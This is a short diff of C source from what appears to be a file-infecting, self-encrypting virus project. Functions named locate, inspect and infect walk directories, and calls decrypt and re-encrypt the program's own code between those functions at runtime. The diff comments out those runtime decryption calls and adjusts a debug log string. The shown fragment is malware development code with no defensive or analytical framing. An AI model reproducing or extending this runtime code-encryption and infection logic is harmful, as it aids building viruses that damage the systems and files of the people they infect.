@@ -9,12 +9,12 @@ void	locate(t_data *data, t_directory *dir)
 {
 
 #ifdef DEBUG
-	char de[] = "locate\t0\n";
-	data->context == true ?	de[7] = 49 : 0;
+	char de[] = "locate\t\t0\n";
+	data->context == true ?	de[8] = 49 : 0;
 	_log(de, _strlen(de));
 #endif
 
-	revert_two(&data->key, (char*)war, (size_t)locate - (size_t)war);
+	/* revert_one(&data->key, (char*)war, (size_t)locate - (size_t)war); */
 
 	int				fd;
 	int				stop;
@@ -71,8 +71,9 @@ iter:
 		goto next;
 	data->context = true;
 
+
 next:
-	update_two(&data->key, (char*)locate, (size_t)inspect - (size_t)locate);
-	revert_two(&data->key, (char*)inspect, (size_t)infect - (size_t)inspect);
+	/* update_one(&data->key, (char*)locate, (size_t)inspect - (size_t)locate); */
+	/* revert_one(&data->key, (char*)inspect, (size_t)infect - (size_t)inspect); */
 	inspect(data, path);
 }
